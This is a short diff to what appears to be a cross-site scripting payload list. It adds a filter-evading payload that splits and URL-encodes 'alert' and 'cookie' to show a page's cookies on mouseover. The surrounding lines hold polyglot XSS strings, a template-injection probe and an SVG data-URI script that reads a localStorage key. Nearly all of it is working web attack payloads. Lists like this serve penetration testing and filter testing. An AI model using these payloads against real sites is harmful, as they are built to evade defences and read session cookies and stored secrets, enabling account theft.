@@ -1,5 +1,7 @@
 '';!--"<XSS>=&{()}
 
+"><a nope%3d"%26quot%3bx%26quot%3b"onmouseover%3d"Reflect.get(frames,'ale'%2b'rt')(Reflect.get(document,'coo'%2b'kie'))">
+
 '"><img src=x>${{7*2}}
 1//%0Aalert?.(/Hunted/)//'/*\'/*"/*\"/*`/*\`/*&apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*S4/*/;{/8/(alert)(/Hunted/)}//>
 JavaScript://%250Aalert?.(/Hunted/)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/<Style/</Script/</textArea/</iFrame/<noScript>\74k<K/contentEditable/autofocus/OnFocus=/*${/*/;{/**/(alert)(/Hunted/)}//>
@@ -79,6 +81,7 @@ iframe srcdoc (may bypass some filters):
 
 SVG with script (data URI):
 <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Eparent.document.body.appendChild(parent.document.createTextNode(localStorage.getItem('MY_KEY')))%3C/script%3E%3C/svg%3E">
+
 
 
 
